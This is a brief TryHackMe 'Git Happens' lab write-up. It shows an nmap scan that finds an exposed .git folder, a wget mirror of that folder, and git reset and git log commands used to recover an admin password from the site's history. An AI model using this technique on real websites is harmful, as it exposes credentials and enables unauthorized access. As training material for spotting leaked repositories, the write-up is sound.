# TryHackMe Git Happens

<div style="text-align: center;">
  <img src="/assets/git-happens1.webp" alt="mannaully
" width="600">
</div>

```
TryhackMe Machine:- Git Happens
Machine Info:- (Git)
Machine Level:- Easy
```

---
Started of with nmap scan

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 17:50 ISTNmap scan report for 10.10.77.136Host is up (0.16s latency).Not shown: 999 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION80/tcp open  http    nginx 1.14.0 (Ubuntu)|_http-title: Super Awesome Site!|_http-server-header: nginx/1.14.0 (Ubuntu)| http-git:|   10.10.77.136:80/.git/|     Git repository found!|_    Repository description: Unnamed repository; edit this file 'description' to name the...Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 48.08 seconds
```

We can see /.git/ folder is there lets get this whole /.git/ .

```bash
wget --mirror -I .git http://10.10.77.136/.git/
```

Now cd into 10.10.77.136 and check the using git show.

Then use git status and then use.

```bash
git reset HEAD --hard 
```

Now using the git log command to see oneline commets.

```bash
git log --oneline --graph
```

<div style="text-align: center;">
  <img src="/assets/git-happens2.webp" alt="mannaully
" width="600">
</div>

You will see that HEAD 395e087 nothing significant was here now lets check the index.html and you will see the the password and the flag there use the admin password as flag.

<div style="text-align: center;">
  <img src="/assets/git-happens3.webp" alt="mannaully
" width="600">
</div>

Thank you for reading
